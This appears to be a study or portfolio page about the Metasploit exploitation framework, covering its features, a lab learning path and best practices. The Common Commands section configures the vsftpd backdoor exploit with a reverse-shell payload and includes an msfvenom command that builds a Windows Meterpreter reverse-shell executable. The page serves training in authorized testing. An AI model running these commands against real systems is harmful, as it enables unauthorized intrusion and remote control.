# Metasploit — Exploitation Framework

**Category:** Exploitation & Penetration Testing
**Difficulty:** Intermediate to Advanced
**License:** Open Source Framework (BSD-style) / Metasploit Pro (commercial, Rapid7)

---

## Description

Metasploit is the most widely used exploitation framework in security testing, providing a structured library of exploits, payloads, and auxiliary modules used to validate the real-world impact of a discovered vulnerability. It's typically the final step in a penetration test — turning "this service has a known vulnerability" into a demonstrated, documented compromise within an authorized engagement.

Security professionals use Metasploit daily for:

- Validating that a discovered vulnerability is actually exploitable, not just theoretically present
- Demonstrating real business impact to stakeholders who need more than a CVE number to prioritize a fix
- Post-exploitation activity (privilege escalation, credential harvesting) within an authorized engagement
- Practicing and understanding attacker tradecraft to build better detections

---

## Key Features

- Extensive library of exploit, payload, and auxiliary modules
- `msfconsole` — the primary interactive command-line interface
- **Meterpreter** — an advanced, in-memory post-exploitation payload
- Database-backed workspace for tracking hosts, services, and vulnerabilities across an engagement
- `msfvenom` — standalone payload generation and encoding
- Direct integration with reconnaissance data (e.g., imported Nmap scan results)
- Post-exploitation modules for privilege escalation, persistence, and lateral movement

---

## Common Commands

### Starting Up

```bash
# Launch the interactive console
msfconsole
```

### Finding and Configuring a Module

```
# Search for a module by keyword/CVE
search type:exploit vsftpd

# Select a module
use exploit/unix/ftp/vsftpd_234_backdoor

# View required and optional settings
show options

# Set target and payload
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD cmd/unix/reverse

# Launch
exploit
```

### Managing Sessions

```
# List active sessions
sessions -l

# Interact with a specific session
sessions -i 1

# Background the current session
background
```

### Payload Generation (msfvenom)

```bash
# Generate a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe
```

---

## Hands-On Learning Path

Metasploit proficiency comes from understanding *why* an exploit works before running it — not from memorizing module names. Below is the progression most cybersecurity students use to build reps, entirely within isolated, authorized lab environments.

**Guided / official starting points**
- [ ] Offensive Security's free "Metasploit Unleashed" course
- [ ] TryHackMe "Metasploit: Introduction" and "Metasploit" rooms

**Home lab (VirtualBox / isolated network)**
- [ ] Exploiting known vulnerable services on a Metasploitable2 VM (e.g., vsftpd backdoor, distcc)
- [ ] Establishing and navigating a Meterpreter session for basic post-exploitation
- [ ] Generating a payload with `msfvenom` and testing it against a lab AV/EDR setup to understand detection

**Applied / integration practice**
- [ ] Chaining a full attack path: Nmap recon → identified service vulnerability → Metasploit exploitation → Meterpreter post-exploitation
- [ ] Mapping a full exploitation chain to MITRE ATT&CK techniques and the Cyber Kill Chain, consistent with the framework used throughout the rest of this portfolio

---

## Best Practices

- **Authorization is absolutely essential.** Metasploit is a live exploitation tool — among the most legally sensitive in this entire toolbox. Never point it at anything without explicit, written permission.
- **Work in an isolated lab network.** Exploits and payloads should never touch a network segment shared with production or personal systems.
- **Understand the exploit before running it.** Read the module's description and target requirements — "set and forget" usage without understanding the underlying vulnerability limits what you actually learn.
- **Be aware exploits can crash target services.** Some modules are inherently unstable — this is a real operational risk during any authorized engagement, not just a lab inconvenience.
- **Clean up after testing.** Close sessions, remove dropped payloads, and document exactly what was left behind on a target system.
- **Expect AV/EDR to flag generated payloads.** This is by design — treat detection as a learning signal, not an obstacle to bypass in unauthorized contexts.

---

## Most Valuable Lessons Learned *(in progress)*

This section will grow with real findings as labs above are completed. Early conceptual takeaway:

- **Exploitation is the smallest part of a real engagement.** Getting a Meterpreter session made clear how much groundwork (recon, service identification, vulnerability research) has to happen correctly before a single exploit module even becomes relevant.

I'd rather keep this honest and incremental than pad it — real lab chains and findings will replace this note as work is completed.

---

## Resources

- [Rapid7 Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Offensive Security: Metasploit Unleashed (free course)](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploitable2 (practice target VM)](https://github.com/rapid7/metasploitable3)
- [TryHackMe: Metasploit Rooms](https://tryhackme.com/room/rpmetasploit)
